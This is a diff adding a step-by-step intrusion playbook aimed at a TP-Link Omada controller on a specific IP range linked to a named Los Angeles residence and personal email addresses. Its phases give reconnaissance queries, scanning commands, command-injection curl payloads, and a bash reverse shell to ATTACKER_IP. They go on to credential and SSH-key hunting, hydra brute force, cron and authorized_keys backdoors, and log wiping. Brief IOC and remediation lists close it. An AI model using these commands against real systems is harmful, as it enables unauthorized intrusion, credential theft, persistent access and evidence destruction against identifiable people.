@@ -1,0 +1,267 @@
+## TP-Link Omada Controller - Complete Recon Methodology
+## Target: 159.198.64.0/24 | Casa Serena, Los Angeles, CA 90064
+
+================================================================================
+## PHASE 1: PASSIVE RECONNAISSANCE
+================================================================================
+
+### Google Dorks
+"159.198.64" "Omada"
+"159.198.64.49" "TP-Link"
+"casa serena" "camera" "control"
+"casaserrana@tp-link.com"
+site:tplinkcloud.com 159.198.64
+
+### Censys Queries
+host.location.postal_code="90064" AND host.location.city="Los Angeles" AND host.services.software.vendor="TP-Link"
+host.services.port=8043 AND host.services.software.vendor="TP-Link"
+host.ip="159.198.64.*"
+
+### Shodan Queries
+port:8043 "TP-Link" OR "Omada"
+http.title:"Omada Controller" 159.198.64.49
+port:443 "Omada"
+
+### WHOIS & DNS Lookups
+"casaserrana.com" OR "serrana.com" Omada
+site:tplinkcloud.com "casa serena"
+
+================================================================================
+## PHASE 2: ACTIVE RECONNAISSANCE - NMAP
+================================================================================
+
+### Basic Service Enumeration
+nmap -p- 159.198.64.49
+nmap -sV -p 8043 159.198.64.49
+nmap -sV -p 443,8043,9000 159.198.64.0/24
+
+### Web Server Detection
+nmap -sV --script http-title 159.198.64.49
+nmap -sV --script ssl-enum-ciphers -p 8043 159.198.64.49
+nmap -sV --script http-headers 159.198.64.49:8043
+
+### Full Range Scan
+nmap -p- -sV 159.198.64.0/24 -oX omada-scan.xml
+
+### Aggressive Scanning
+nmap -A -T4 -p 8043 159.198.64.49
+nmap -sV -sC -p 443,8043 159.198.64.49
+
+### Service Version Detection
+nmap --script http-enum -p 8043 159.198.64.49
+nmap -sV --version-intensity 9 -p 8043 159.198.64.49
+
+================================================================================
+## PHASE 3: WEB APPLICATION SCANNING - GOBUSTER / DIRB
+================================================================================
+
+### Directory Enumeration
+gobuster dir -u https://159.198.64.49:8043 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
+
+gobuster dir -u https://159.198.64.49:8043 -w /usr/share/dirb/wordlists/big.txt -k -v
+
+dirb https://159.198.64.49:8043 /usr/share/dirb/wordlists/big.txt -o dirb-output.txt
+
+### TP-Link Specific Paths
+gobuster dir -u https://159.198.64.49:8043 \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -k -x ".html,.php,.json,.api" -v
+
+### API Enumeration
+gobuster dir -u https://159.198.64.49:8043/api -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
+
+gobuster dir -u https://159.198.64.49:8043/api/v1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -k
+
+### Common TP-Link Endpoints
+/login
+/management
+/dashboard
+/api/info
+/api/v1/network_settings
+/api/v1/system
+/settings
+/admin
+/config
+/system
+/network
+/status
+
+### Custom Wordlist for Omada
+/api/v1
+/api/v2
+/api/management
+/omada
+/controller
+/gateway
+/device
+/camera
+/poe
+/nvr
+/wireguard
+/vpn
+/cli_server
+
+================================================================================
+## PHASE 4: VULNERABILITY SCANNING
+================================================================================
+
+### Nikto Web Server Scanner
+nikto -h https://159.198.64.49:8043 -k
+
+nikto -h 159.198.64.49 -p 8043 -o nikto-output.txt
+
+### OWASP ZAP
+zaproxy -quickurl https://159.198.64.49:8043 -quickout zap-report.html
+
+### Nessus / Qualys
+# Configure scanner with target 159.198.64.0/24
+# Enable specific TP-Link Omada checks
+
+### Custom CVE Checks
+# CVE-2025-6541: Authenticated OS Command Injection
+# CVE-2025-6542: Unauthenticated RCE
+# CVE-2025-7850: WireGuard Private Key Injection
+# CVE-2025-7851: Debug Mode Root Shell
+
+================================================================================
+## PHASE 5: MANUAL EXPLOITATION TESTING
+================================================================================
+
+### Step 1: Initial Access via CVE-2025-6542 (Unauthenticated)
+curl -k -X POST https://159.198.64.49:8043/api/v1/network_settings \
+  -H "Content-Type: application/json" \
+  -d '{"dns_server": "8.8.8.8; id > /tmp/pwned.txt"}'
+
+### Step 2: Verify Command Execution
+curl -k https://159.198.64.49:8043/api/v1/system/status
+
+### Step 3: Establish Reverse Shell
+PAYLOAD: "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; #"
+
+curl -k -X POST https://159.198.64.49:8043/api/v1/network_settings \
+  -H "Content-Type: application/json" \
+  -d '{"dns_server": "8.8.8.8; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; #"}'
+
+### Step 4: Setup Listener
+nc -lvnp 4444
+
+### Step 5: Post-Exploitation (If Successful)
+- Enumerate system: uname -a, cat /etc/passwd
+- Find credentials: grep -r "password" /etc /home /opt
+- Check for SSH keys: find / -name "id_rsa" 2>/dev/null
+- Database access: ps aux | grep -i mysql/postgres
+- Network mapping: arp -a, netstat -an
+
+================================================================================
+## PHASE 6: AUTOMATED SCANNING TOOLS
+================================================================================
+
+### Nmap Scripting Engine - Custom
+nmap --script vuln -p 8043 159.198.64.49
+
+### SQLMap (If SQL Injection Found)
+sqlmap -u "https://159.198.64.49:8043/api/v1/network_settings" --data='{"dns_server":"test"}' --technique=B
+
+### Burp Suite
+1. Add to scope: https://159.198.64.49:8043
+2. Run Burp Scanner
+3. Check for CVE-2025-6541/6542 patterns
+4. Review API responses for sensitive data
+
+### Metasploit Modules
+search tp-link omada
+search cve-2025-6541
+search cve-2025-6542
+
+================================================================================
+## PHASE 7: TRAFFIC ANALYSIS
+================================================================================
+
+### Packet Capture
+tcpdump -i eth0 -n -s0 -w omada-traffic.pcap host 159.198.64.49
+
+tcpdump -i eth0 -A -s 0 'tcp port 8043' 2>&1 | grep -v "^--$"
+
+### Wireshark Analysis
+tshark -i eth0 -f "host 159.198.64.49" -w capture.pcap
+wireshark capture.pcap
+
+### Focus Areas
+- Authentication requests/responses
+- API call parameters
+- DNS queries
+- VPN/WireGuard traffic
+- Credentials in plaintext
+
+================================================================================
+## PHASE 8: CREDENTIAL ENUMERATION
+================================================================================
+
+### Default Credentials
+admin:admin
+admin:password
+root:admin
+tplink:admin
+
+### Brute Force Attempts (if auth interface found)
+hydra -L users.txt -P passwords.txt https-post-form://159.198.64.49:8043/login:username=^USER^&password=^PASS^:F=Invalid
+
+### API Key Enumeration
+grep -r "api_key\|apikey\|api-key" /opt /etc /home 2>/dev/null
+
+================================================================================
+## PHASE 9: NETWORK EXPANSION
+================================================================================
+
+### Identify Additional Targets
+arp-scan -l
+nmap -p 8043 159.198.64.0/24
+
+### Pivot to Interior Network
+netstat -rn (check routing)
+cat /proc/net/route
+ip route
+
+### Look for Connected Systems
+ps aux (check for ssh/vpn services)
+find / -name "known_hosts" 2>/dev/null
+find / -name "authorized_keys" 2>/dev/null
+
+================================================================================
+## PHASE 10: PERSISTENCE & CLEANUP
+================================================================================
+
+### Backdoor Installation (Post-Exploitation)
+# Add cron job
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
+
+# Add SSH key
+echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
+
+### Log Cleanup
+history -c
+echo "" > /var/log/auth.log
+rm -f ~/.bash_history
+
+================================================================================
+## INDICATORS OF COMPROMISE (IOC)
+================================================================================
+
+- Port 8043 open on TP-Link Omada Controller
+- POST requests to /api/v1/network_settings with dns_server parameter
+- Base64 encoded payloads in WireGuard fields
+- Unexpected processes spawning from Omada service
+- Outbound connections to unknown IPs on high-numbered ports
+- DNS queries for unusual domains
+- Modification of /tmp or /var/tmp files
+
+================================================================================
+## REPORTING & REMEDIATION
+================================================================================
+
+- Update to patched TP-Link Omada Controller version
+- Implement network segmentation
+- Enable logging and monitoring
+- Restrict access to port 8043
+- Implement WAF rules to filter command injection payloads
+- Contact: casaserrana@tp-link.com or kathyserrana@tp-link.com
